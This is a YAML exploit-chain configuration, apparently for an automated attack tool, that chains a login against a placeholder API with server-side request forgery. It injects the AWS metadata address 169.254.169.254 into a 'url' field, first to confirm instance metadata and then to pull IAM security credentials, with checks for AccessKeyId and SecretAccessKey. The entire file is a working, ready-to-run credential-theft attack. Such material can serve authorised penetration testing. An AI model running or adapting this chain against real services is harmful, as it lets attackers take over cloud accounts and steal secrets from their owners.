exploit_chain:
  name: "SSRF AWS Metadata Extraction"
  description: "Exploit SSRF to extract AWS instance metadata."
  steps:
    - name: "Login as User"
      description: "Authenticate and extract token."
      request_config:
        method: "POST"
        url: "https://api.example.com/login"
        json_data:
          username: "attacker"
          password: "password123"
      success_indicators:
        - "status_code == 200"
        - "token in response.json"
      data_extractors:
        token: "json:token"
    - name: "Trigger SSRF"
      description: "Send SSRF payload to fetch AWS metadata."
      request_config:
        method: "POST"
        url: "https://api.example.com/api/fetch"
        headers:
          Authorization: "Bearer {{token}}"
      payload_injection_points:
        - location: "json_path"
          target_field: "url"
          payload_type: "static"
          payload_value: "http://169.254.169.254/latest/meta-data/"
      success_indicators:
        - "status_code == 200"
        - "py:'ami-id' in response.text or 'instance-id' in response.text"
      failure_indicators:
        - "forbidden"
        - "unauthorized"
      data_extractors:
        metadata: "response_text"
    - name: "Extract AWS Credentials"
      description: "Send SSRF payload to fetch AWS credentials."
      request_config:
        method: "POST"
        url: "https://api.example.com/api/fetch"
        headers:
          Authorization: "Bearer {{token}}"
      payload_injection_points:
        - location: "json_path"
          target_field: "url"
          payload_type: "static"
          payload_value: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
      success_indicators:
        - "status_code == 200"
        - "py:'AccessKeyId' in response.text and 'SecretAccessKey' in response.text"
      failure_indicators:
        - "forbidden"
        - "unauthorized"
      data_extractors:
        aws_creds: "response_text" 